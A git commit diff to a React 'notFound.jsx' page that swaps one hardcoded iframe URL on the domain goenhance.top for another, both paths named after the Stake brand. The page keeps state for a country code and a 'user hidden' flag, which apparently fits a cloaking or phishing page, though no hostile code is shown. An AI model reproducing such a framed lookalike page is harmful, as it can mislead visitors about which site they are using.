1f05afeb5dba958d423b9f46d0ef09db187537c2
abdulmueezrana6 <164713426+abdulmueezrana6@users.noreply.github.com>
2025-08-07 20:56:13 +0700

    Update notFound.jsx

--- src/pages/notFound.jsx
+++ src/pages/notFound.jsx
@@ -7,7 +7,7 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://goenhance.top/stakeuscom');
+  let[IframeUrl, SetIframeUrl] = useState('https://goenhance.top/stakecom');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
